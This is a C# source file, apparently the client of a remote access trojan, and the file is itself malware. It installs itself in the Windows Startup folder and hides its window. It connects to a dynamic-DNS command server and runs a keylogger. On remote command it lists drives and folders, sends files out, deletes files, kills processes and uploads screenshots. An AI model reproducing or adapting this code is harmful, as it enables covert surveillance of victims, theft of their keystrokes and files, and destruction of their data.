using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net.Sockets;
using System.Runtime.Serialization.Formatters.Binary;
using System.Text;
using System.Threading;
using System.Threading;
using System.Windows.Forms;
using System.Net;
namespace HackerClient
{
    class Program
    {
        static TcpClient clientComm;
        static TcpClient clientSeri;
        static Thread keylogginThread;
  
        static void Main(string[] args)
        {
            while (true)
            {
                try
                {
                    Console.Title = "Dennis";
                    Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\WindowsData");
                    //Console.WriteLine("Schritt 1");
                    
                    //Console.WriteLine("Schritt 2");
                    try
                    {
                        File.Copy(Application.ExecutablePath, Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\task.exe", true);
                        //Console.WriteLine("Schritt 3");
                    }
                    catch (Exception)
                    {
                        //Console.WriteLine("Schritt 4");
                    }

                    Process[] pros = Process.GetProcessesByName("task.exe");
                    foreach (Process item in pros)
                    {
                        try
                        {
                            item.Kill();
                        }
                        catch (Exception)
                        {
                            
                        }
                    }

                    if (!Application.ExecutablePath.StartsWith(Environment.GetFolderPath(Environment.SpecialFolder.Startup)))
                    {
                        Process.Start(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\task.exe");
                        return;
                    }

                    Keylogger keylogger = new Keylogger();
                    keylogger.hide();

                    //Console.WriteLine("Schritt 5");
                    clientComm = new TcpClient("nuggetor.ddns.net", 2015);
                    //Console.WriteLine("Schritt 6");
                    //Console.WriteLine("Connected to comm server");
                    byte[] buffer = ASCIIEncoding.ASCII.GetBytes(Environment.UserName + "\n" + Environment.MachineName);
                    clientComm.GetStream().Write(buffer, 0, buffer.Length);

                    //Console.WriteLine("Müsste funktioniert haben, warte 5 Sekunden");
                    //Thread.Sleep(1000);

                    keylogginThread = new Thread(keylogger.run);
                    keylogginThread.Start();
                    listen();
                }
                catch (Exception)
                {
                    //Console.WriteLine("Schritt 7");
                    //Console.WriteLine("Da ist was falsch gelaufen");
                    //Thread.Sleep(5000);
                }

            }

        }

        private static void listen()
        {
            clientSeri = new TcpClient(); 
            while (true)
            {
                //BufferedStream buffered = new BufferedStream(clientComm.GetStream());
                
                byte[] buffer = new byte[1024];

                Console.WriteLine("Reading...");

                clientComm.GetStream().Read(buffer, 0, 1024);

                Console.WriteLine("Message Recieved");

                String message = ASCIIEncoding.ASCII.GetString(buffer);
                message = message.Substring(0, message.IndexOf("\0"));
                Console.WriteLine("Message = " + message);

                #region get Drives

                if (message == "cd drives")
                {
                    using (TcpClient uclientSeri = new TcpClient())
                    {


                        uclientSeri.Connect("nuggetor.ddns.net", 2014);
                        Console.WriteLine("Connected with serializing Server");
                        try
                        {
                            foreach (string drive in Directory.GetLogicalDrives())
                            {
                                TreeNode dN = new TreeNode();
                                dN.Name = drive;
                                dN.Text = drive;
                                dN.ImageKey = "drive";
                                dN.SelectedImageKey = "drive";
                                //treeView1.Nodes.Add(dN);
                                BinaryFormatter binF = new BinaryFormatter();
                                binF.Serialize(uclientSeri.GetStream(), dN);
                                Console.WriteLine("Send " + drive);
                                //searchFolder(drive, dN, client);
                            }
                            uclientSeri.Close();
                        }
                        catch (Exception)
                        {
                            uclientSeri.Close();
                        }

                    }

                }

                #endregion

                #region get Directories and Files

                else if (message.StartsWith("cd "))
                {
                    string path = message.Substring(3);
                    using (TcpClient uclientSeri = new TcpClient())
                    {


                        uclientSeri.Connect("nuggetor.ddns.net", 2014);
                        try
                        {
                            Console.WriteLine("Connected with serializing Server");
                            searchFolder(path, uclientSeri);
                            Thread.Sleep(100);
                            uclientSeri.Close();
                        }
                        catch (Exception)
                        {
                            uclientSeri.Close();
                        }
                    }


                }

                #endregion

                #region download file

                else if (message.StartsWith("download "))
                {
                    try
                    {
                        string path = message.Substring(9);
                        FileSender send = new FileSender(path);
                        Thread t = new Thread(send.sendFile);
                        t.Start();
                    }
                    catch (Exception)
                    {
                    }

                }

                #endregion

                #region start / stop Keylogging

                else if (message.StartsWith("startlogging"))
                {
                    try
                    {

                            keylogginThread.Start();

                        clientComm.GetStream().Write(ASCIIEncoding.ASCII.GetBytes("success"), 0, ASCIIEncoding.ASCII.GetBytes("success").Length);
                    }
                    catch (Exception)
                    {
                        clientComm.GetStream().Write(ASCIIEncoding.ASCII.GetBytes("failed"), 0, ASCIIEncoding.ASCII.GetBytes("failed").Length);
                    }

                }

                else if (message.StartsWith("stoploggin"))
                {
                    try
                    {
                            keylogginThread.Abort();
                            clientComm.GetStream().Write(ASCIIEncoding.ASCII.GetBytes("success"), 0, ASCIIEncoding.ASCII.GetBytes("success").Length);
                        
                    }
                    catch (Exception)
                    {

                        clientComm.GetStream().Write(ASCIIEncoding.ASCII.GetBytes("failed"), 0, ASCIIEncoding.ASCII.GetBytes("failed").Length);
                    }

                }

                #endregion

                #region delete Files

                if (message.StartsWith("delete "))
                {
                    string path = message.Substring(6);
                    try
                    {
                        File.Delete(path);
                        byte[] text = ASCIIEncoding.ASCII.GetBytes("Deleting succesfull!");
                        clientComm.GetStream().Write(text, 0, text.Length);
                    }
                    catch (Exception e)
                    {
                        byte[] text = ASCIIEncoding.ASCII.GetBytes("Error while deleting: " + e.ToString());
                        clientComm.GetStream().Write(text, 0, text.Length);
                    }

                }

                #endregion

                #region get Processes

                if (message.Equals("getProcesses"))
                {
                    Process[] processes = Process.GetProcesses();

                    foreach (Process pro in processes)
                    {
                        byte[] text = ASCIIEncoding.ASCII.GetBytes(pro.ProcessName + "/n");
                        clientComm.GetStream().Write(text, 0, text.Length);
                    }
                    byte[] textEnd = ASCIIEncoding.ASCII.GetBytes("/e");
                    clientComm.GetStream().Write(textEnd, 0, textEnd.Length);
                }

                #endregion

                #region kill Processes

                if (message.StartsWith("kill "))
                {
                    string name = message.Substring(5);

                    Process[] pros = Process.GetProcessesByName(name);

                    foreach (Process pro in pros)
                    {
                        pro.Kill();
                    }
                }

                #endregion

                #region Screenshot

                if(message.StartsWith("screenshot"))
                {
                    Bitmap b = new Bitmap(SystemInformation.VirtualScreen.Width, SystemInformation.VirtualScreen.Height);
                    Graphics g = Graphics.FromImage(b);
                    g.CopyFromScreen(0, 0, 0, 0, b.Size);
                    g.Dispose();
                    Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\WindowsData");
                    b.Save(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\WindowsData\screen.tmp");

                    FileSender fs = new FileSender(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\WindowsData\screen.tmp");
                    fs.sendFile();

                    File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\WindowsData\screen.tmp");
                }

                #endregion

                #region Chat

                if (message.Equals("startChat"))
                {
                    Chat chatform = new Chat();
                    chatform.ShowDialog();
                }
                #endregion
            }
        }

        private static void searchFolder(string dir, TcpClient client)
        {
            try
            {
                foreach (string dirC in Directory.GetDirectories(dir))
                {
                    TreeNode tdir = new TreeNode(dirC);

                    string[] splitted = dirC.Split(new char[] { '\\' });
                    tdir.Text = splitted[splitted.Length - 1];

                    tdir.Name = dirC;


                    if (hasFiles(dirC))
                        tdir.ImageKey = "full folder";

                    else
                        tdir.ImageKey = "empty folder";

                    tdir.SelectedImageKey = tdir.ImageKey;


                    //e.Nodes.Add(tdir);
                    BinaryFormatter formatter = new BinaryFormatter();
                    formatter.Serialize(client.GetStream(), tdir);
                    Console.WriteLine("Send " + tdir.Text);
                }
            }
            catch (Exception e) { Thread.Sleep(10); }


            try
            {
                foreach (string fileC in Directory.GetFiles(dir))
                {
                    TreeNode tfile = new TreeNode(fileC);

                    string[] splitted = fileC.Split(new char[] { '\\' });
                    tfile.Text = splitted[splitted.Length - 1];
                    tfile.Name = fileC;

                    ContextMenu menu = new System.Windows.Forms.ContextMenu();
                    MenuItem item = new MenuItem("Download");
                    menu.MenuItems.Add(item);
                    item.Name = tfile.Name;
                    item.Tag = tfile.Text;
                    tfile.ContextMenu = menu;
                    BinaryFormatter formatter = new BinaryFormatter();
                    formatter.Serialize(client.GetStream(), tfile);
                    Console.WriteLine("Send " + tfile.Text);
                }
            }

            catch (Exception) { }

        }

        private static bool hasFiles(string dir)
        {
            try
            {
                if (Directory.GetDirectories(dir).Length == 0 && Directory.GetFiles(dir).Length == 0)
                {
                    return false;
                }
                return true;
            }
            catch (Exception)
            {
            }

            return false;

        }

    }
}
